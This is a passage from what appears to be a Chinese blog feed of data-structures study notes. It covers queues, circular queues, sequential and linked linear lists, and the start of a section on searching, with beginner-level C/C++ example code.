class="built_in">InitQueue</span>(Q);</span><br><span class="line">    <span class="type">int</span> test;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input Elem number:&quot;</span>;</span><br><span class="line">    cin&gt;&gt;test;</span><br><span class="line">    QElemType e;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;test;i++)&#123;</span><br><span class="line">        e=<span class="built_in">rand</span>();</span><br><span class="line">        <span class="built_in">EnQueue</span>(Q, e);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/* QElemType e1;</span></span><br><span class="line"><span class="comment">    e1.a=1;</span></span><br><span class="line"><span class="comment">    QElemType e2;</span></span><br><span class="line"><span class="comment">    e2.a=2;</span></span><br><span class="line"><span class="comment">    EnQueue(Q, e1);</span></span><br><span class="line"><span class="comment">    EnQueue(Q, e2);*/</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;the length is:&quot;</span>&lt;&lt;<span class="built_in">QueueLength</span>(Q)&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">QueueTravers</span>(Q);</span><br><span class="line">    QElemType ge;</span><br><span class="line">    <span class="built_in">GetHead</span>(Q, ge);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;ge is:&quot;</span>&lt;&lt;ge&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">DeQueue</span>(Q, ge);</span><br><span class="line">    <span class="built_in">QueueTravers</span>(Q);</span><br><span class="line">   <span class="comment">// ClearQueue(Q);</span></span><br><span class="line">   <span class="comment">// QueueTravers(Q);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//  cout&lt;&lt;&quot;the length is:&quot;&lt;&lt;QueueLength(Q)&lt;&lt;endl;</span></span><br><span class="line">  <span class="comment">//  DestoryQueue(Q);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h4><p>循环队列是顺序队列的特例，把顺序队列构造成一个首尾相连的循环表</p><p>存储实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  QElemType *base;</span><br><span class="line">  <span class="type">int</span> front;</span><br><span class="line">  <span class="type">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>循环队列空状态和满状态都满足Q.front==Q.rear</p><p>1.可以另设一个变量count记录队列中的元素个数，当为0时队列空；当为MASQSIZE时队列满</p><p>2.以头指针在队列尾指针的下一位置作为队列满的标志，牺牲一个存储空间 队满条件为：(sq.rear+1)% maxsize==sq.front</p><p>​     队空条件为：sq.rear==sq.front</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 线性表</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="线性表的定义和特点"><a href="#线性表的定义和特点" class="headerlink" title="线性表的定义和特点"></a>线性表的定义和特点</h3><h4 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h4><p>线性表是n个类型相同元素的有限序列，通常记作($a_1$,$a_2$,$a_3$,…,$a_n$)</p><h4 id="线性表的特点"><a href="#线性表的特点" class="headerlink" title="线性表的特点"></a>线性表的特点</h4><p>1.集合中必存在唯一的一个第一元素</p><p>2.集合中必存在唯一的一个最后元素</p><p>3.除最后元素之外，均有唯一的后继</p><p>4.除第一元素之外，均有唯一的前驱</p><h4 id="线性表的抽象数据类型描述"><a href="#线性表的抽象数据类型描述" class="headerlink" title="线性表的抽象数据类型描述"></a>线性表的抽象数据类型描述</h4><p>ADT List {</p><p>​    数据对象：D={$a_i$|$a_j$ $\in$ElemSet,i=1,2…,n,n$\geqslant$0}</p><p>​                            {称n为线性表的表长；</p><p>​                                称n=0时的线性表为空表}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i$ $\in$ D,i=2,3,…,n}</p><p>​    基本操作：</p><p>​            InitList(&amp;L)    //构造空线性表</p><p>​            DestoryList(&amp;L)   //销毁线性表L</p><p>​            ListEmpty(L)    //    判断L是否空</p><p>​            ListLength(L)    //求L长度</p><p>​            PriorElem(L,cur_e,&amp;pre_e)    //求前驱</p><p>​            NextElem(L,cur_e,&amp;next_e)    //求后继</p><p>​            GetElem(L,i,&amp;e)    //取i位置的值</p><p>​            PutElem(&amp;L,i,e)    //线性表赋值</p><p>​            LocateElem(L,e,compare())    //在线性表中查找e</p><p>​            ListTraverse(L,visit())     //遍历线性表</p><p>​            ClearList(&amp;L)    //清空线性表</p><p>​            ListInsert(&amp;L,i,e)     //在i位置插入e</p><p>​            ListDelete(&amp;L,i,&amp;e)    //删除i位置的元素</p><p>​    }ADT List</p><h3 id="线性表的顺序表示和实现"><a href="#线性表的顺序表示和实现" class="headerlink" title="线性表的顺序表示和实现"></a>线性表的顺序表示和实现</h3><h4 id="存储结构实现"><a href="#存储结构实现" class="headerlink" title="存储结构实现"></a>存储结构实现</h4><p>用一组地址连续的存储单元依次存放线性表中的数据元素</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">  <span class="type">int</span> listsize;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h4 id="基本操作实现"><a href="#基本操作实现" class="headerlink" title="基本操作实现"></a>基本操作实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype *elem;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    <span class="type">int</span> listsize;</span><br><span class="line">&#125;SqList;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList_Sq</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    L.elem=(Elemtype*)<span class="built_in">malloc</span>(LIST_INIT_SIZE*<span class="keyword">sizeof</span>(Elemtype));</span><br><span class="line">    <span class="keyword">if</span>(!L.elem)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    &#125;</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">    L.listsize=LIST_INIT_SIZE;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;InitList SqList successfully.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowList_Sq</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=L.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,L.elem[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DestoryList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(L.elem);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListEmpty</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L.length==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SqList is empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SqList is not empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PriorElem</span><span class="params">(SqList L,<span class="type">int</span> cur_e,Elemtype &amp;pre_e )</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur_e&lt;=<span class="number">0</span>||L.length==<span class="number">0</span>||cur_e&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pre_e=L.elem[cur_e<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,Elemtype e)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;--j)</span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[j+<span class="number">1</span>]=L.elem[j];</span><br><span class="line">    &#125;</span><br><span class="line">    L.elem[i<span class="number">-1</span>]=e;</span><br><span class="line">    ++L.length;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Insert operation succeed.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (L.length&gt;=L.listsize)&#123;</span><br><span class="line">        Elemtype *newbase;</span><br><span class="line">        newbase=(Elemtype*)<span class="built_in">realloc</span>(L.elem,(L.listsize+LISTINCREMENT)*<span class="keyword">sizeof</span>(Elemtype));</span><br><span class="line">        <span class="keyword">if</span>(!newbase) <span class="built_in">printf</span>(<span class="string">&quot;failed!&quot;</span>);</span><br><span class="line">        L.elem=newbase;</span><br><span class="line">        L.listsize+=LISTINCREMENT;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,Elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    e=L.elem[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">-1</span>;j&lt;L.length<span class="number">-1</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[j]=L.elem[j+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;delete succeed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0---exit\n1--InitList_Sq\n2--DestoryList\n3--ShowList_Sq\n4--ListEmpty\n5--ListLength\n6--PriorElem\n7--ListInsert_Sq\n8--ListDelete_Sq\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;================================\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> temp;SqList L;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input button:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process exit.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">1</span>) InitList_Sq(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">2</span>) DestoryList(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">3</span>) ShowList_Sq(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">4</span>) ListEmpty(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">5</span>) <span class="built_in">printf</span>(<span class="string">&quot;List length:%d\n&quot;</span>,ListLength(L));</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">6</span>)&#123;</span><br><span class="line">            Elemtype pre_e;</span><br><span class="line">            <span class="type">int</span> cur_e;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input cur_e:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;cur_e);</span><br><span class="line">            PriorElem(L, cur_e, pre_e);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;PriorElem is:%d&quot;</span>,pre_e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">7</span>)&#123;</span><br><span class="line">            Elemtype e;</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;insert before i:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input data(int):&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;e);</span><br><span class="line">            ListInsert_Sq(L, i, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">8</span>)&#123;</span><br><span class="line">            Elemtype e;</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input number to delete:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">            ListDelete_Sq(L, i, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h4><p>优点：节省存储空间；对线性表中的第i个结点的操作易于实现；容易查找一个结点的前驱和后继</p><p>缺点：插入和删除需要移动数据；建立空表时较难确定所需的存储空间</p><h3 id="线性表的链式表示和实现"><a href="#线性表的链式表示和实现" class="headerlink" title="线性表的链式表示和实现"></a>线性表的链式表示和实现</h3><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure><h4 id="基本操作实现-1"><a href="#基本操作实现-1" class="headerlink" title="基本操作实现"></a>基本操作实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1;</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListEmpty</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="keyword">return</span> TRUE;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">return</span> FALSE;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElem_L</span><span class="params">(LinkList L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    LNode* p;</span><br><span class="line">    p=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p=L-&gt;next;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    e = p-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    LNode* p=L;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LNode *s;</span><br><span class="line">    s=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data=e;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Insert succeed.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    LNode *p=L;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next)||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LNode *q=p-&gt;next;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    e=q-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Delete succeed.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(L-&gt;next)&#123;</span><br><span class="line">        LNode *p;</span><br><span class="line">        p=L-&gt;next;</span><br><span class="line">        L-&gt;next=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;</span><br><span class="line">    InitList(L);</span><br><span class="line">    ElemType e;</span><br><span class="line">    e=<span class="number">1</span>;</span><br><span class="line">    ListInsert_L(L, <span class="number">1</span>, e);</span><br><span class="line">    L-&gt;next-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;L-&gt;next-&gt;next&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><p>单链表的最后一个结点的指针指向头指针</p><p>优点是从表中任意结点出发都可以找到其他结点</p><p>循环链表采用头尾指针，因为这样查找第一个结点和最后一个结点都容易</p><h4 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h4><p>存储实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>&#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">prior</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 查找</title>
      <link href="/2023/11/21/"/>
      <url>/2023/11/21/</url>
      
        <content type="html"><![CDATA[<p>本节的哈希散列技术还有待进一步掌握</p><h3 id="查找的前置知识"><a href="#查找的前置知识" class="headerlink" title="查找的前置知识"></a>查找的前置知识</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>1.查找表：同一类型的数据元素或记录构成的集合</p><p>2.静态查找表：仅作查询和检索操作的查找表</p><p>3.动态查找表：在查找时包含插入、删除或修改</p><p>4.主关键字：可以识别的一个记录的数据项(字段)</p><p>5.次关键字：关联若干记录的数据项（字段）</p><p>6.根据给定的某个值，在查找表中确定一个群关键字等于给定值的数据元素(记录)</p><p>7.查找成功：查找表中存在满足条件的记录</p><p>8.查找不成功：查找表中不存在满足条件的记录</p><h4 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> Keytype; <span class="comment">//Keytype为浮点数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Keytype;<span class="comment">//Keytype为整型数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> Keytype;<span class="comment">//Keytype为字符指针数据类型</span></span><br></pre></td></tr></table></figure><p>数据元素定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">Keytype key;<span class="comment">//关键字</span></span><br><span class="line">... <span class="comment">//可以是其他关键字</span></span><br><span class="line">&#125;ElemType;<span class="comment">//ElemType结构体数据类型</span></span><br></pre></td></tr></table></figure><h4 id="查找的分类"><a href="#查找的分类" class="headerlink" title="查找的分类"></a>查找的分类</h4><p>1.基于关键词比较的查找：顺序查找、折半查砸后、分块查找、BST&amp;AVL、B-树和B+树</p><p>2.基于关键字存储位置的查找：散列法</p><p>根据被查找的数据集合存储位置又分为：</p><p>1.内查找：整个查找过程都在内存进行</p><p>2.外查找：查找过程中需要访问外存</p><h3 id="静态查找表"><a href="#静态查找表" class="headerlink" title="静态查找表"></a>静态查找表</h3><h4 id="顺序表的查找"><a href="#顺序表的查找" class="headerlink" title="顺序表的查找"></a>顺序表的查找</h4><h5 id="静态查找表的抽象数据类型"><a href="#静态查找表的抽象数据类型" class="headerlink" title="静态查找表的抽象数据类型"></a>静态查找表的抽象数据类型</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT StaticSearchTable&#123;</span><br><span class="line">数据对象D：D是具有相同特性的数据元素的集合。每个数据元素含有类型相同的关键字，可唯一表示数据元素。</span><br><span class="line">数据关系R：数据元素同属一个集合</span><br><span class="line">基本操作P：</span><br><span class="line"><span class="built_in">Create</span>(&amp;ST,n);<span class="comment">//建立静态查找表</span></span><br><span class="line"><span class="built_in">Destroy</span>(&amp;ST);<span class="comment">//销毁静态查找表</span></span><br><span class="line"><span class="built_in">Search</span>(ST,key)<span class="comment">//按关键字key查找</span></span><br><span class="line"><span class="built_in">Traverse</span>(ST,<span class="built_in">visit</span>());<span class="comment">//遍历查找表</span></span><br><span class="line"><span class="comment">//插入、删除操作，在顺序表中不适合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="顺序查找表的存储结构"><a href="#顺序查找表的存储结构" class="headerlink" title="顺序查找表的存储结构"></a>顺序查找表的存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br></pre></td></tr></table></figure><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search_Seq</span><span class="params">(SSTable ST,KeyType key)</span></span>&#123;</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=key;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=ST.length;ST.elem[i].key!=key;i--);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">    <span class="comment">//若返回非0，则找到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> 